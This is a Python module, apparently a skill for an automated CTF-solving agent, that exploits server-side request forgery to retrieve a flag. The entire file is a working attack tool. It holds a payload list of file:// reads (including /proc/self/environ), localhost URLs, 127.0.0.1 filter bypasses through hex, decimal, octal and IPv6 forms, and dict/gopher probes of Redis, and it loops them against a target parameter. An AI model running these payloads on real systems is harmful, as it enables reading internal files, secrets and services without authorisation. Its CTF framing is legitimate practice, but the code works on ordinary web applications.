"""SSRF 利用 Skill：通过 SSRF 读取内网 flag 文件。

适用场景：Web 题存在 URL/参数可被服务端请求（fetch/curl），
需绕过过滤访问 file:// 或内网 127.0.0.1 服务。
输入：target_url + url_param
输出：flag 或内网响应内容
"""
import re

try:
    import httpx
except ImportError:
    httpx = None


SSRF_TARGETS = [
    # file:// 协议读本地文件
    "file:///flag",
    "file:///flag.txt",
    "file:///app/flag",
    "file:///app/flag.txt",
    "file:///home/flag",
    "file:///tmp/flag",
    "file:///var/www/html/flag",
    "file:///etc/flag",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    # 内网 HTTP
    "http://127.0.0.1/flag",
    "http://127.0.0.1:80/flag",
    "http://127.0.0.1:8080/flag",
    "http://127.0.0.1:5000/flag",
    "http://127.0.0.1:8000/flag",
    "http://127.0.0.1:9000/flag",
    "http://localhost/flag",
    "http://localhost:8080/flag",
    # 绕过 127.0.0.1 过滤
    "http://0.0.0.0/flag",
    "http://0x7f000001/flag",
    "http://2130706433/flag",
    "http://0177.0.0.1/flag",
    "http://[::1]/flag",
    "http://[::ffff:127.0.0.1]/flag",
    "http://127.1/flag",
    "http://127.0.1/flag",
    "http://127.000.000.001/flag",
    # 内网服务名
    "http://internal/flag",
    "http://app/flag",
    "http://backend/flag",
    # dict / gopher 协议
    "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_INFO",
]


def run(target_url: str = "", url_param: str = "url", method: str = "GET", **kwargs) -> dict:
    results = {"flag": "", "evidence": "", "ssrf_target": ""}

    target_url = target_url or kwargs.get("url", "")
    url_param = url_param or kwargs.get("param", "url")

    if not target_url:
        results["evidence"] = "缺少 target_url 参数"
        return results

    if httpx is None:
        results["evidence"] = "缺少 httpx 库"
        return results

    flag_pattern = re.compile(r"(?:flag|DASCTF)\{[^}]+\}")

    for ssrf_url in SSRF_TARGETS:
        try:
            if method.upper() == "GET":
                resp = httpx.get(target_url, params={url_param: ssrf_url},
                                 timeout=8, follow_redirects=True)
            else:
                resp = httpx.post(target_url, data={url_param: ssrf_url},
                                  timeout=8, follow_redirects=True)
            text = resp.text
            if not text:
                continue
            flag_match = flag_pattern.search(text)
            if flag_match:
                results["flag"] = flag_match.group(0)
                results["ssrf_target"] = ssrf_url
                results["evidence"] = f"SSRF 成功: {ssrf_url}"
                return results
            # 记录有意义的响应
            if len(text) > 10 and "error" not in text.lower()[:20]:
                if not results["evidence"]:
                    results["evidence"] = f"SSRF 响应 ({len(text)}B): {text[:100]}"
                    results["ssrf_target"] = ssrf_url
        except Exception:
            continue

    if not results["flag"]:
        results["evidence"] = results.get("evidence", "") or "未找到有效 SSRF 路径"
    return results
